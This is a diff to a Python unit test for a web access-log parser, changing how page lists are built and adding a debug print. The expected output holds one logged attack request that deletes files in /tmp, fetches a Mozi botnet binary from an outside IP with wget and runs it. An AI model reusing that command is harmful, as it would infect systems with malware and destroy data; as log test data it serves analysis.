@@ -66,11 +66,13 @@ class TestStringMethods(unittest.TestCase):
         page_list=[]
         count_page_list=[]
         diff_page_list=[]
-        lt.getPageLists(parsed_log1,diff_page_list,count_page_list,page_list)
-        lt.getPageLists(parsed_log2,diff_page_list,count_page_list,page_list)
-        lt.getPageLists(parsed_log3,diff_page_list,count_page_list,page_list)
-        lt.getPageLists(parsed_log4,diff_page_list,count_page_list,page_list)
+        lt.initpageLists(parsed_log1,diff_page_list,count_page_list)
+        lt.initpageLists(parsed_log2,diff_page_list,count_page_list)
+        lt.initpageLists(parsed_log3,diff_page_list,count_page_list)
+        lt.initpageLists(parsed_log4,diff_page_list,count_page_list)
+        page_list=lt.getPageLists(count_page_list,diff_page_list)
         output=[["GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.44.54.120:42097/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1",1],["GET /wp-cron.php HTTP/1.1",1],["GET / HTTP/1.1",1],["GET /public/img/mongo-express-logo.png HTTP/1.1",1]]
+        print("page list  ",page_list)
         self.assertEqual(output[0], page_list[0])
 
 
